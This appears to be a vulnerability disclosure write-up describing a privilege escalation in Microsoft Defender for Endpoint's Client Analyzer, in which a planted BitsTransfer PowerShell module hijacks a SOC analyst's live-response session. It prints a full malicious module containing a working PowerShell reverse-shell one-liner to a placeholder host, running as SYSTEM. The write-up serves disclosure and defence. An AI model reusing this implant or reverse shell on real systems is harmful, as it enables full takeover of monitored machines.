# Summary

If you are using Microsoft Defender for Endpoint for your SOC operation, be cautious when collecting suppport logs with "Microsoft Defender for Endpoint Client Analyzer" tool via live a response session. If an endpoint has been compromised to an extend and the attacker has permissions to write to specific paths, he can conduct a PowerShell Module Implant atack. Below is a description of a conditional privilege escalation attack using the Powershell Module Implant technique. Microsoft doesn't recognize this as an vulnerability since by default the paths listed in "Preconditions for the Attack" are not writable by a none admin user. Fair point and understandable. But nevertheless this  information should be available to the public. 
    
# Description

When contacting support, Microsoft may ask for the output package of the "Microsoft Defender for  Endpoint Client Analyzer" tool. This guidance is available in the article "Collect support logs in Microsoft Defender for Endpoint using live response" (https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-collect-support-log?view=o365-worldwide). I discovered that the "Microsoft Defender for Endpoint Client Analyzer" tool does not check the integrity of PowerShell modules and allows an attacker to gain "nt authority\system" privileges on the victim machine.

## Preconditions for the Attack
    
* The user has permissions to write into one of the following directories on the victim machine:
   * .\WindowsPowerShell\Modules
   * C:\Program Files\WindowsPowerShell\Modules
   * C:\Windows\system32\WindowsPowerShell\v1.0\Modules   
   * C:\Program Files\Microsoft Monitoring Agent\Agent\PowerShell

* A SOC analyst establishes a Live response session to the victim in Microsoft 365 Security Center and runs the "Microsoft  Defender for Endpoint Client Analyzer" tool
    
## Steps to Reproduce
 
The "Microsoft Defender for Endpoint Client Analyzer" tool is available at the following URL https://aka.ms/MDELiveAnalyzer (a compressed MDELiveAnalyzer.ps1 script). The script when uploaded can be run in the Live response command console from  Microsoft 365 Security Center as "run MDELiveAnalyzer.ps1". As seen below, the script drops **MDEClientAnalyzer.ps1** with some additional tools. 

![alt text](https://github.com/rashimo/secaware/blob/main/MDE_Conditional_Privesc/figure1.JPG?raw=true)

The script MDEClientAnalyzer.ps1, dropped by MDELiveAnalyzer.ps1, is carefully designed and checks the integrity of executables via the **Check-Command-verified** function which calls the **CheckAuthenticodeSignature** function to check the signature of executables. Part of the function is visible below. 

![alt text](https://github.com/rashimo/secaware/blob/main/MDE_Conditional_Privesc/figure2.JPG?raw=true)
   
In the privilege escalation attack we are trying to plant a malicious **BitsTransfer** module in one of the default paths of PowerShell modules. The PSModulePath environment variable stores the paths to the locations of the modules that are installed on disk. PowerShell uses this variable to locate modules when the user does not specify the full path to a module. In the Live response session, the PSModulePath environment variable contains the following paths:

* WindowsPowerShell\Modules
* C:\Program Files\WindowsPowerShell\Modules
* C:\Windows\system32\WindowsPowerShell\v1.0\Modules
* C:\Program Files\Microsoft Monitoring Agent\Agent\PowerShell\

The privilege escalation attack assumes that some of the paths are writable for the current user. The first one (WindowsPowerShell\Modules) is unlikely since the Live response sessions runs in the path "C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\" which requires "NT Authority\System" privileges to access or modify the content. The second and third are more likely. In the simulation we are using the second path (C:\Program Files\WindowsPowerShell\Modules). 

We create a new module at:

`C:\Program Files\WindowsPowerShell\Modules\BitsTransfer\BitsTransfer.psm1`

The content of the module is visible below.

```
function Start-BitsTransfer
{
 Param
 (
 [Parameter(Mandatory=$false)]
 [string] $Source,
 [Parameter(Mandatory=$false)]
 [string] $Destination,
[Parameter(Mandatory=$false)]
 [string] $TransferType,
[Parameter(Mandatory=$false)]
[switch] $Asynchronous,
[Parameter(Mandatory=$false)]
 [string] $Description,
[Parameter(Mandatory=$false)]
 [string] $RetryTimeout,
[Parameter(Mandatory=$false)]
 [string] $RetryInterval
 )
Write-Host $env:PSModulePath
$client = New-Object System.Net.Sockets.TCPClient("XXX.XXX.XXX.XXX",443);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -
ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = 
(iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Fl
ush()};$client.Close()
}
```

The module contains the necessary arguments since from MDEClientAnalyzer.ps1 the **Start-BitsTransfer** function is called twice like:

```
Start-BitsTransfer -source $webfile -Destination "$DlZipFile" -Description "Downloading 
additional files" -RetryTimeout 60 -RetryInterval 60 -ErrorAction SilentlyContinue

Start-BitsTransfer -Source $WPTURL -Destination "$DlZipFile" -TransferType Download -
Asynchronous
```
The other part of the malicious module prints the environment variable PSModulePath and establishes a reverse connection to XXX.XXX.XXX.XXX on port 443. 

The attacker that planted the malicious module in "C:\Program Files\WindowsPowerShell\Modules\BitsTransfer\BitsTransfer.psm1" is now waiting for the live response sessions and the collection of the output package of the "Microsoft Defender for Endpoint Client Analyzer" tool.

Once a SOC analyst establishes a live response session, uploads the MDELiveAnalyzer.ps1 scripts and runs it, the attacker gets a reverse shell to the victim as "NT Authority\System". In the first figure below we can see the SOC analyst running MDELiveAnalyzer.ps1 and the output of the malicious **BitsTransfer** module. In the second figure below we can see an established reverse shell to the attacker machine. It is also visible that the reverse shell runs whit privileges of "nt authority\system". This concludes our privilege escalation attack.

![alt text](https://github.com/rashimo/secaware/blob/main/MDE_Conditional_Privesc/figure3.JPG?raw=true)

![alt text](https://github.com/rashimo/secaware/blob/main/MDE_Conditional_Privesc/figure4.JPG?raw=true)
